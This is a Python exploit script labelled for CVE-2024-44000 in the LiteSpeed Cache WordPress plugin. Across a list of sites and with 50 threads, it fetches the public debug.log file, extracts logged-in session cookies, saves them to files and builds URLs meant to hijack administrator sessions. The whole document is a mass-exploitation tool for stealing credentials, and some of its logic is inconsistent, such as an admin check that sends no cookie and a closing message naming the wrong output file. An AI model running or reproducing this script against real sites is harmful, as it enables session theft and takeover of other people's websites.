import re
import argparse
import pycurl
import io
from urllib.parse import urljoin, quote
from multiprocessing.dummy import Pool as ThreadPool
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Function to perform a curl request and return response, ensuring utf-8 decoding
def curl_request(url):
    buffer = io.BytesIO()
    curl = pycurl.Curl()
    curl.setopt(curl.URL, url)
    curl.setopt(curl.WRITEFUNCTION, buffer.write)
    curl.setopt(curl.FOLLOWLOCATION, True)
    curl.setopt(curl.TIMEOUT, 10)
    try:
        curl.perform()
        response_code = curl.getinfo(pycurl.RESPONSE_CODE)
        response_data = buffer.getvalue().decode('utf-8', errors='ignore')  # Ensure UTF-8 decoding
        return response_code, response_data
    except pycurl.error as e:
        return None, str(e)
    finally:
        curl.close()

# Function to extract cookies from log response (ensure regex works with UTF-8)
def extract_cookies(log_data):
    cookies = []
    for line in log_data.splitlines():
        match = re.search(r'Cookie: (.*)', line)
        if match:
            cookies.append(match.group(1))
    return cookies

# Function to extract session cookies (UTF-8 safe extraction)
def extract_session_cookies(cookies):
    session_cookies = []
    for cookie in cookies:
        match = re.search(r'wordpress_logged_in_[^=]+=[^;]+', cookie)
        if match:
            session_cookies.append(match.group(0))
    return session_cookies

# Function to check cookies for a given URL
def extract_and_use_cookies(url):
    log_url = urljoin(url, "wp-content/debug.log")
    response_code, log_data = curl_request(log_url)

    if response_code == 200:
        # Always save the debug log if the status code is 200
        print(f"{Fore.GREEN}[+] Successfully accessed the debug log file for {url}")
        with open('debug.txt', 'a', encoding='utf-8') as debug_file:
            debug_file.write(f"Site: {url}/wp-content/debug.log\n")

        # Now extract cookies and validate
        cookies = extract_cookies(log_data)
        if cookies:
            session_cookies = extract_session_cookies(cookies)
            if session_cookies:
                print(f"{Fore.GREEN}[+] Extracted session cookies for {url}: {session_cookies}")
                with open('cookies.txt', 'a', encoding='utf-8') as cookies_file:
                    cookies_file.write(f"Site: {url}\n")
                    cookies_file.write(f"Cookies: {session_cookies}\n")
                    cookies_file.write("\n")

                for admin_cookie in session_cookies:
                    cookie_name, cookie_value = admin_cookie.split('=')
                    admin_url = urljoin(url, "wp-admin/")
                    response_code, _ = curl_request(admin_url)

                    if response_code == 302:  # HTTP 302 indicates a redirect (possibly logged in)
                        hijacked_url = f"{urljoin(url, 'wp-login.php')}?redirect_to={quote(admin_url + f'?{cookie_name}={cookie_value}')}&reauth=1"
                        cookie_set_url = f"{urljoin(url, 'wp-login.php')}?cookie={cookie_name}={cookie_value}"
                        
                        print(f"{Fore.GREEN}[+] Successfully hijacked admin session for {url} with cookie: {admin_cookie}")
                        
                        with open('success.txt', 'a', encoding='utf-8') as success_file:
                            success_file.write(f"Site: {url}\n")
                            success_file.write(f"Hijacked Admin Session URL: {hijacked_url}\n")
                            success_file.write(f"Cookie Set URL: {cookie_set_url}\n")
                            success_file.write("\n")
                        
                        return True
                    else:
                        print(f"{Fore.RED}[-] Failed to hijack admin session for {url} with cookie: {admin_cookie}")
            else:
                print(f"{Fore.RED}[-] No session cookies found in the log file for {url}")
        else:
            print(f"{Fore.RED}[-] No cookies found in the log file for {url}")
    else:
        print(f"{Fore.RED}[-] Failed to access the debug log file for {url}. Status code: {response_code}")

    return False

# Function to handle the URL checking process
def check_url(url):
    url = url.strip()
    extract_and_use_cookies(url)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="LiteSpeed Cache Cookie Extractor and Admin Login (CVE-2024-44000)")
    parser.add_argument("file", help="File containing list of WordPress site URLs")
    args = parser.parse_args()

    # Open the input file and read all URLs, ensuring UTF-8 encoding
    with open(args.file, 'r', encoding='utf-8') as file:
        urls = file.readlines()

    # Create a thread pool with 50 threads
    pool = ThreadPool(50)

    # Start the checking process for each URL
    pool.map(check_url, urls)

    # Close the pool and wait for the work to finish
    pool.close()
    pool.join()

    print(f"{Fore.CYAN}[+] Checking completed. Valid sites saved to valid.txt")
